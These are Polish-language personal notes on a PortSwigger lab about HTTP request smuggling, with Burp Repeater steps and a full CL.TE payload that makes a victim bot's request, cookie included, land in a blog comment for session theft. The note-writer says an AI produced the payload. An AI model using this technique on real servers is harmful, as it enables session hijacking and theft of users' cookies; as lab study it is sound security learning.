
Lab: Exploiting HTTP request smuggling to capture other users' requests - a te requesty zawierają ich ciasteczka

https://www.youtube.com/watch?v=v0jWcPEjNXI OK !!

<img width="677" height="302" alt="image" src="https://github.com/user-attachments/assets/ed6d6bce-b485-41f9-83a8-9db268f0eb2b" />


!!!!!!!!Chodzi o to żeby request ofiary wpadł do comment= 


~~~~~~~~~~~~~~chyba niepowinnam odswiezac strony szybko bo bo requescie z proxy server od razu dostaje moj request z przegladarki, a nie bota


Krok 1 – Zostaw komentarz i złap request
Wejdź na post blogowy (sprawdź które postId istnieje!)
Zostaw dowolny komentarz
W Proxy History znajdź POST /post/comment → wyślij do Repeatera


Krok 2 – Ważne ustawienie Repeatera
W Repeaterze przełącz na HTTP/1 (lab tego wymaga!):

Downgrade do HTTP 1.1
Uncheck: Update Content Lenght
          Normalize cośtam

Krok 3 – Przestaw parametry
comment musi być ostatni:
csrf=TOKEN&postId=X&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=


Krok4:
claude mi zrobil taki payload > 302 i 200 ~i 500w kolko > dodaly sie komentarze w imiemmiu Carlosa > kopiuje jego session cookie i secret i wklejm do requestu z logowania
jeśli cookie sie nie mieszczą to zwiąkszam ilosc znaków
ostatecznie content lenght w drugim requescie byl 1000
_____
POST / HTTP/1.1
Host: 0ad2009304bd9cac81f15799005100e7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0ad2009304bd9cac81f15799005100e7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 400 
Cookie: session=E2EKorj1icJ93FrvBirmewbSOugNHSbc

csrf=SYPKERCWfxUoBaYLBpuq8rHRpUXkJuCH&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=
_______






Alternatywnie – użyj HTTP Request Smuggler
Zamiast ręcznie budować payload:

Weź oryginalny POST /post/comment
Prawym → Extensions → HTTP Request Smuggler → Smuggle Attack (CL.TE)









